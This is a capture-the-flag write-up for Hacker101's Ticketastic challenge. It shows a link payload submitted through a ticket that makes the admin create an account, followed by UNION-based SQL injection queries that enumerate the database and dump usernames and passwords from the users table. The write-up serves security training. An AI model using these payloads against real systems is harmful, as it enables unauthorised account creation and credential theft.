
## # Ticketastic: Live Instance (Hacker101)
Hacker101 CTF <br>
Difficulty: Moderate<br>
Categories: blind XSS(?), SQL injection

## Steps FLAG0
Based on the "Demo Instance" challenge, we can examine the /newUser  and /newTicket function. New users are added with this parameter ``/newUser?username=wiener&password=test&password2=test``.

Hence, we can construct a script and send it via the ticket submission. The goal is that the admin will click the ticket and executing the script.
```
<a href="http://localhost/newUser?username=wiener&password=peter&password2=peter">test</a>
``` 
Once the ticket is submitted, we can login with the user we just created. 

## Steps FLAG1
Playing with the /ticket endpoint, I got an SQL error which means it is vulnerable to SQL injection. A UNION option is useful to examine the database.

Find number of table columns:
```
/ticket?id=1.1 UNTION SELECT 1,2,3--
```
Now we know that there are 3 columns, we can examine the database version and the schemas:
```
/ticket?id=1.1UNION SELECT VERSION(),DATABASE(),3--
```
**Result:** 10.1.37-MariaDB-0+deb9u1, level7
Now that we know the database name, we can continue to search for tables, columns, and data. 
```
/ticket?id=1.11 UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
```
**Result:** id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```
/ticket?id=1.11 UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='tickets'--
```
**Result:** id,title,body,reply
```
/ticket?id=1.11 UNION SELECT id,username,password FROM users--
```
**Result:** FLAG1


## References:
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
